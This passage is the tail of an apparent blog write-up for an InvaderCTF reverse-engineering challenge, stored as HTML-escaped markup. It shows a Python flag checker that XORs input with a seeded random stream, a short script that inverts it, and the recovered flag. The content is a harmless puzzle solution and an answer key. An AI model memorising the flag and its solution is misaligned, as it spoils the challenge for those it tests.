&lt;&#x2F;span&gt;&lt;span&gt;random&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;seed&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;u&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;[5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x80&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;E&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x1d\x1a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;X&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x91&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;Z&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x8f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encrypt&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;string&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    enc &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[]
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;char &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;string:
&lt;&#x2F;span&gt;&lt;span&gt;        temp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;ord&lt;&#x2F;span&gt;&lt;span&gt;(char) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;120 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^ &lt;&#x2F;span&gt;&lt;span&gt;random&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getrandbits&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;7&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;        enc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;append&lt;&#x2F;span&gt;&lt;span&gt;(temp)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;bytearray&lt;&#x2F;span&gt;&lt;span&gt;(enc)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;flag &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;Enter flag : &amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;encFlag &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encrypt&lt;&#x2F;span&gt;&lt;span&gt;(flag)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;encFlag &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\xd1\xe0\xb3\x9e\x80\xbf\xd3\x97\xa1\xda\x97\xdd\xe4\xef\xc9\xdf\x92\xff\xa2\xd5\x95\xfc\x99\xe6\xbc\xfa\xf5\xab\xd1\x89\xae\xd4\xe0\x94\xbb\x80\x96\x97\xa4\xd5\xd1\xe6\xce&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;Flag was right :)&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;Nope&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The encrypted flag is&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;\xd1\xe0\xb3\x9e\x80\xbf\xd3\x97\xa1\xda\x97\xdd\xe4\xef\xc9\xdf\x92\xff\xa2\xd5\x95\xfc\x99\xe6\xbc\xfa\xf5\xab\xd1\x89\xae\xd4\e0\x94\xbb\x80\x96\x97\xa4\xd5\xd1\xe6\xce
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;I have to get the input char from the encrypted flag, the encryption is done with the XOR operation.
And the seed is also same for every byte, so we can get flag char by&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;temp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;ord&lt;&#x2F;span&gt;&lt;span&gt;(char) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;120 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^ &lt;&#x2F;span&gt;&lt;span&gt;random&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getrandbits&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;7&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;ord&lt;&#x2F;span&gt;&lt;span&gt;(char) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;encryptedbyte &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^ &lt;&#x2F;span&gt;&lt;span&gt;random&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getrandbits&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;7&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;120
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The script to get the flag is&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;random
&lt;&#x2F;span&gt;&lt;span&gt;random&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;seed&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;u&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;[5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x80&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;E&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x1d\x1a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;X&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x91&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;Z&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x8f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;enc_flag &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;l &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;list&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\xd1\xe0\xb3\x9e\x80\xbf\xd3\x97\xa1\xda\x97\xdd\xe4\xef\xc9\xdf\x92\xff\xa2\xd5\x95\xfc\x99\xe6\xbc\xfa\xf5\xab\xd1\x89\xae\xd4\xe0\x94\xbb\x80\x96\x97\xa4\xd5\xd1\xe6\xce&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;j &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[]
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;l:
&lt;&#x2F;span&gt;&lt;span&gt;    temp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^ &lt;&#x2F;span&gt;&lt;span&gt;random&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getrandbits&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;7&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    temp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;120
&lt;&#x2F;span&gt;&lt;span&gt;    j&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;append&lt;&#x2F;span&gt;&lt;span&gt;(temp)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;j:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;chr&lt;&#x2F;span&gt;&lt;span&gt;(i)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;end&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : InvaderCTF{d3c0mpilati0n_m4kes_l1f3_e4si3r}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;p&gt;Thank you &amp;lt;3&lt;&#x2F;p&gt;
</content>
        
    </entry>
</feed>
